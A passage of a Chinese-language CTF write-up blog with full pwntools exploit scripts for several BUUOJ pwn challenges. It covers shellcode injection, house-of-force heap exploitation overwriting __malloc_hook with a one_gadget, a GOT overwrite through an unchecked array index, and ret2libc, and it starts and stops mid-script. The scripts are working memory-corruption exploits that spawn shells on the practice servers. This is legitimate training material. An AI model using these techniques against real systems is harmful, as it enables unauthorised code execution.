data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">.</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>mode <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./starctf_2019_babyshell_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">29462</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">if</span> mode<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token string\">'b puts'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'j\\0'</span> <span class=\"token operator\">+</span> asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>sh<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"gyctf_2020_force\"><a class=\"markdownIt-Anchor\" href=\"#gyctf_2020_force\">#</a> gyctf_2020_force</h1>\n<p>** 考点：**hof</p>\n<p>**libc 版本：**libc6_2.23_0ubuntu10_amd64</p>\n<p>保护全开，只有分配函数，但是写入数据的最大长度固定为 0x50，且会返回 chunk 所处位置。</p>\n<p>因此可以修改 top 的 size。然后就可以实现任意地址读写。</p>\n<p>在修改 top 的 size 之前，先分配一个很大的 chunk，该 chunk 便会以 mmap 的形式分配在 libc 紧邻的低地址处，以此获得 libc 基地址。</p>\n<p><img data-src=\"./image-20231119222021018.png\" alt=\"image-20231119222021018\"></p>\n<p>左侧绿线红色即为 libc 基地址，左侧绿线紫色为大 chunk 所分配的起始地址。计算偏移为 0x200ff0。</p>\n<p>然后分配一个小 chunk，如 0x18 大小的 chunk，顺便将 top size 设为 - 1，同时得到小 chunk 的地址，top 的地址便为其加 0x10。</p>\n<p>之后计算出 <code>__malloc_hook</code>  的地址，然后分配一个 chunk 使得 top chunk 指向 malloc_hook 小 20 地址的地方。计算得到所需分配的 chunk 大小即为 <code>malloc_hook - top address - 0x30</code> 。之后再次分配 chunk 便可以修改 <code>__malloc_hook</code>  的值。</p>\n<p>由于直接将 <code>__malloc_hook</code>  修改为 one_gadget 将不满足条件，则利用 realloc 作为跳板，同时修改 <code>__realloc_hook</code>  的值为 one_gadget。经调试，需要减少两个 realloc 函数的 pop 命令以此达到利用条件，所以 <code>__malloc_hook</code>  调用的 realloc 地址加 4。</p>\n<p><img data-src=\"./image-20231119224848965.png\" alt=\"image-20231119224848965\"></p>\n<p><code>0x7ffcdbbbcec8</code>  为调佣 <code>__malloc_hook</code>  前的栈状态，这里 `__malloc_hook 跳转 realloc+4。</p>\n<p><img data-src=\"./image-20231119224937682.png\" alt=\"image-20231119224937682\"></p>\n<p>以上图为 <code>call rax</code>  即调用 one_gadget 后的栈状态。此时 rsp+0x70 的地址即为 <code>0x7ffcdbbbced8</code>  处，刚好为 0。rsp+0x30 也是，选一个即可。</p>\n<p><img data-src=\"./image-20231119224950904.png\" alt=\"image-20231119224950904\"></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>filename <span class=\"token operator\">=</span> <span class=\"token string\">'gyctf_2020_force'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>libcfile <span class=\"token operator\">=</span> <span class=\"token string\">'/home/walt/share/pwn/libc/libc6_2.23-0ubuntu10_amd64/libc/lib/x86_64-linux-gnu/libc-2.23.so'</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>libcfile<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>mode <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">29788</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">if</span> mode<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token string\">'b *$rebase(0xCA5)'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">suspend</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">if</span> mode <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">choose</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'2:puts\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">mal</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">,</span> content<span class=\"token operator\">=</span><span class=\"token string\">b'aaaa'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'size\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'addr '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    addr <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'content\\n'</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">return</span> addr</pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>mc1u <span class=\"token operator\">=</span> mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x200000</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>libcbase <span class=\"token operator\">=</span> mc1u <span class=\"token operator\">+</span> <span class=\"token number\">0x200ff0</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>mh_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>realloc_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'realloc'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>onegadget <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0xf1147</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>c1u <span class=\"token operator\">=</span> mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'/bin/sh\\0'</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xffffffffffffffff</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>t1 <span class=\"token operator\">=</span> c1u <span class=\"token operator\">+</span> <span class=\"token number\">0x10</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'t1:'</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>t1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'size:'</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>mh_a<span class=\"token operator\">-</span>t1<span class=\"token operator\">-</span><span class=\"token number\">0x30</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>mal<span class=\"token punctuation\">(</span>mh_a <span class=\"token operator\">-</span> t1 <span class=\"token operator\">-</span> <span class=\"token number\">0x30</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>onegadget<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>realloc_a<span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>choose<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'size'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"51\"></td><td><pre>obj = LibcSearcher('__malloc_hook',mh_a)</pre></td></tr><tr><td data-num=\"52\"></td><td><pre>libcbase = mh_a - obj.dump('__malloc_hook')</pre></td></tr><tr><td data-num=\"53\"></td><td><pre>fh_a = libcbase + obj.dump('__free_hook')</pre></td></tr><tr><td data-num=\"54\"></td><td><pre>sys_a = libcbase + obj.dump('system')</pre></td></tr><tr><td data-num=\"55\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"wustctf2020_name_your_dog\"><a class=\"markdownIt-Anchor\" href=\"#wustctf2020_name_your_dog\">#</a> wustctf2020_name_your_dog</h1>\n<p>** 考点：** 送分题</p>\n<p>未开启 pie 和 relro 保护。</p>\n<p>未判断数组下标，直接任意地址读写修改 got 表为后门函数 shell 的地址。</p>\n<p>因为该程序为 32 位程序，以 4 字节为单位，但其写入以 8 字节为单位。数组起始地址为 0x8041060，所以必须寻找 got 表地址以 8 或 0 结尾的。</p>\n<p><img data-src=\"./image-20231120133449929.png\" alt=\"image-20231120133449929\"></p>\n<p>因此这里不能修改 printf，应该去修改 scanf。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>e<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./wustctf2020_name_your_dog'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process('./wustctf2020_name_your_dog')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">28854</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b printf')</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>target <span class=\"token operator\">=</span> <span class=\"token number\">0x80485CB</span> </pre></td></tr><tr><td data-num=\"10\"></td><td><pre>offset <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'__isoc99_scanf'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x0804a060</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>index <span class=\"token operator\">=</span> offset <span class=\"token operator\">//</span> <span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span>offset </pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n>'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'plz: '</span><span class=\"token punctuation\">,</span> p32<span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"wdb_2018_3rd_soeasy\"><a class=\"markdownIt-Anchor\" href=\"#wdb_2018_3rd_soeasy\">#</a> wdb_2018_3rd_soEasy</h1>\n<p>** 考点：**ret2libc</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher3 <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'i386'</span><span class=\"token punctuation\">,</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>filename <span class=\"token operator\">=</span> <span class=\"token string\">'wdb_2018_3rd_soEasy'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>libcfile <span class=\"token operator\">=</span> <span class=\"token string\">'/home/walt/share/pwn/libc/libc6_2.23-0ubuntu10_i386/libc/lib/i386-linux-gnu/libc-2.23.so'</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>libcfile<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>mode <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">\"./\"</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">28559</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">if</span> mode<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token string\">'b puts'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">suspend</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">if</span> mode <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>main_a <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>puts_p <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token comment\">#write_p = e.plt['write']</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>lsm_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>offset<span class=\"token operator\">=</span><span class=\"token number\">0x048</span> <span class=\"token operator\">+</span> <span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'->'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>buf <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'[+]buf:'</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span>offset <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>puts_p<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>main_a<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>lsm_g<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token comment\">#payload = b'a'*offset + p32(write_p) + p32(main_a) + p32(1) + p32(lsm_g) +p32(4)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'do?\\n'</span><span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>lsm_a <span class=\"token operator\">=</span> u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'the true address of __libc_start_main is %#x'</span><span class=\"token operator\">%</span>lsm_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token comment\">#choose use LibcSearcher or libc file</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token comment\">#'''</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>obj <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">,</span>lsm_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>libcbase <span class=\"token operator\">=</span> lsm_a <span class=\"token operator\">-</span> obj<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>sys_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> obj<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>bs_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> obj<span class=\"token punctuation\">.</span>dump<span 